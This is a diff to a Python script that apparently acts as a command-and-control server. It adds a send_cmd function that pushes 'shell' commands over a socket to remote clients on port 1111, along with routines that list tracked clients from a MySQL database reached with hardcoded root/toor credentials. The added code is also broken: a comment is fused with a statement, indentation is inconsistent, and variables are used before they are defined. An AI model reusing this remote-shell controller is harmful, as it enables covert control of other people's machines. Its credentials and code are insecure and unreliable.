@@ -64,7 +64,9 @@ def check_alive():
 				min = int(local_date_minute) - int(remote_date_minute)
 				sec = int(local_date_secondes) - int(remote_date_secondes)
 
-				Hours_diff = True
+				db = MySQLdb.connect("localhost","root","toor","clients")
+                                cursor = db.cursor()
+                                # Init connexion à la BDD				Hours_diff = True
 
 				if str(local_date_prefixe) != str(remote_date_prefixe):
 				# Si le client ne s'est pas connecté depuis plus d'1h ou plus
@@ -89,6 +91,100 @@ def check_alive():
                                         print("[+] Client seems down : " + str(uuid))
                                         db.close()
                                         # Update le status du client à 'Down'
+
+def send_cmd(remote_cmd,remote_client):
+	# Need to take two args : The remote command and the remote host to interact with
+
+#	print("[DEBUG] Sending command :" + str(remote_cmd))
+
+	socket_cmd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	socket_cmd.connect((str(remote_client), 1111))
+
+	chaine = "shell " + str(remote_cmd)
+
+	try:
+		socket_cmd.send(chaine.encode())
+		socket_cmd.close()
+#		print("[DEBUG] Command send !")
+	except:
+		socket_cmd.close()
+#		print("[DEBUG] Command not send, debug me !")
+
+def who_is_alive():
+	db = MySQLdb.connect("localhost","root","toor","clients")
+        cursor = db.cursor()
+        # Init connexion à la BDD
+
+        cursor.execute( """select id,lip,computer from clients.clients""")
+        rows = cursor.fetchall()
+        db.close()
+	array1 = []
+	count_array = 0
+	count = 0
+
+	for elems in str(rows).split(","):
+		array1.append(elems)
+	for elems in array1:
+		count_array += 1
+	nb_elems = count_array / 3
+	print(" ")
+	print("[+] There is " + str(nb_elems) + " connected clients : ")
+
+	if nb_elems == 1:
+		chaine = str(result[1]) + " : " + str(result[2])
+                print("[" + str(result[a]) + "] " + chaine)
+
+	else:
+		for result in rows:
+			for x in range (0,nb_elems-1):
+				a = x * 3
+				b = a + 1
+				c = b + 1
+				d = x + 1
+			chaine = str(result[b]) + " : " + str(result[c])
+			print("[" + str(result[a]) + "] " + chaine)
+		print(" ")
+
+def who_is_alive_connected():
+        db = MySQLdb.connect("localhost","root","toor","clients")
+        cursor = db.cursor()
+        # Init connexion à la BDD
+
+        cursor.execute( """select id,lip,computer from clients.clients where status = 'Alive'""")
+        rows = cursor.fetchall()
+        db.close()
+        array1 = []
+        count_array = 0
+        count = 0
+
+        for elems in str(rows).split(","):
+                array1.append(elems)
+        for elems in array1:
+                count_array += 1
+        nb_elems = count_array / 3
+        print(" ")
+        print("[+] There is " + str(nb_elems) + " connected clients : ")
+
+	if nb_elems == 0:
+		print("[-] All clients seems down")
+
+
+	elif nb_elems == 1:
+		for result in rows:
+			for x in range (0,nb_elems-1):
+				chaine = str(result[1]) + " : " + str(result[2])
+                		print("[" + str(result[0]) + "] " + chaine)
+
+	else:
+        	for result in rows:
+	                for x in range (0,nb_elems-1):
+        	                a = x * 3
+        	                b = a + 1
+        	                c = b + 1
+        	                d = x + 1
+        	        chaine = str(result[b]) + " : " + str(result[c])
+        	        print("[" + str(result[a]) + "] " + chaine)
+		print(" ")
 
 
 #while True:
